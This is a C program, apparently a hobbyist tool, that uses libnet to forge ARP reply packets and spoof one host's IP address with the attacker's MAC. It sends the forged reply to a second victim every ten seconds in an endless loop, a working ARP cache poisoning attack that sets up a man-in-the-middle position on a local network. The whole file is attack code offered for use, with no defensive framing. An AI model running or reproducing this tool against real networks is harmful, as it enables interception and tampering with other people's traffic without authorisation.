#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <string.h>
#include <time.h>
//#include "arpv2.h"

int main(int argc, char* argv[])
{
	//OCTETS
	u_int8_t* src, *dst;
	char* device = argv[1];
	char errbuff[LIBNET_ERRBUF_SIZE]; //0x100

	u_int32_t ip_attacker_network;
	char ip_victim[16];
	char ip_destination[16];

	char mac_victim[17];
	char mac_destination[17];
	u_int8_t* mac_victim_network;
	u_int8_t* mac_destination_network;

	u_int32_t ip_victim_network;
	u_int32_t ip_destination_network;

	struct libnet_ether_addr* mac_attacker;
	u_int8_t* mac_attacker_octet;

	printf("Welcome to the robo scorpio poisoner [0.0]_/ Robo scorpio says \"STINGGGGG :)\"\n\n");

	if(argc < 4)
	{
		perror("usage: device victim1IP victim2IP victim2MACOCTET");
		exit(404);
	}

	printf("Initializing...\nDevice is %s\n", device);
	libnet_t* lib_nt = libnet_init(LIBNET_LINK, device, errbuff);
	if(lib_nt == NULL)
	{
		perror("Could not start LIBNET, try running with root priviledges");
		exit(1);
	}

	printf("Getting your IP...\n");
	ip_attacker_network = libnet_get_ipaddr4(lib_nt);
	printf("Your IP got @ %x\n", ip_attacker_network);
	//Convert ip to network bytes
	ip_victim_network = libnet_name2addr4(lib_nt, argv[2], LIBNET_DONT_RESOLVE); //0
	printf("Victim1's IP is %s as hex %x\n", argv[2], ip_victim_network);
	ip_destination_network = libnet_name2addr4(lib_nt, argv[3], LIBNET_DONT_RESOLVE); //0
	printf("Victim2's IP is %s as hex %x\n", argv[3], ip_destination_network);

	int size_mac = 17;
	//printf("Please enter the Victim2's MAC address\n");
	//fscanf(stdin, "%17s", mac_destination);
	mac_destination_network = libnet_hex_aton(argv[4], &size_mac);

	printf("Getting required MAC addresses...\n");
	mac_attacker = libnet_get_hwaddr(lib_nt);
	mac_attacker_octet = mac_attacker->ether_addr_octet;
	//Manipulate victim 0x0806 ETHERTYPE_ARP
	printf("Building packet...\n");
	libnet_ptag_t arp_hdr = libnet_autobuild_arp(ARPOP_REPLY, mac_attacker_octet, (u_int8_t*)(&ip_victim_network), mac_destination_network, (u_int8_t*)(&ip_destination_network), lib_nt);
	libnet_ptag_t ip_hdr = libnet_autobuild_ethernet(mac_destination_network, 0x806, lib_nt);

	if(arp_hdr == -1 || ip_hdr == -1)
	{
		perror("Could not build packet");
		exit(2);
	}

	for(;;)
	{
		printf("Executing Poisoning...\n");
		if(libnet_write(lib_nt) == -1)
		{
			perror("Unable to write packet");
			exit(3);
		}
		else
			printf("Success\n");
		sleep(10);
	}

	//Manipulate Gateway
	libnet_destroy(lib_nt);
	libnet_close_link(lib_nt);
	return 0;
}
